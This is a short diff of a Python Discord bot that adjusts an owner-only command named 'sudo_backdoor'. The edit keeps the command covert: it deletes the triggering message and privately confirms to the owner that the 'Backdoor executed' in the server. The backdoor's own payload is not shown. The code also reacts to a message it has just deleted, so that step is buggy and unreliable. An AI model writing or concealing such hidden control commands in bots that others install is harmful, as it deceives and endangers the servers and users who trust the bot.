@@ -112,18 +112,25 @@ async def sudo_backdoor(ctx):
     if not is_owner(ctx):
         return
 
+    # delete the command message
     try:
         await ctx.message.delete()
     except discord.Forbidden:
         pass
 
+    # add a silent confirmation reaction
     try:
-        await ctx.author.send(
-            f"✔️ Command received in **{ctx.guild.name}**."
-        )
+        await ctx.message.add_reaction("✅")
     except discord.Forbidden:
         pass
 
+    # DM confirmation (silent if DMs closed)
+    try:
+        await ctx.author.send(
+            f"✔️ Backdoor executed in **{ctx.guild.name}**."
+        )
+    except discord.Forbidden:
+        pass
 # ================= DM UNBAN + BANLIST =================
 @bot.event
 async def on_message(message):
@@ -224,3 +231,4 @@ if not TOKEN:
 
 time.sleep(10)  # prevent Railway reconnect spam
 bot.run(TOKEN)
+
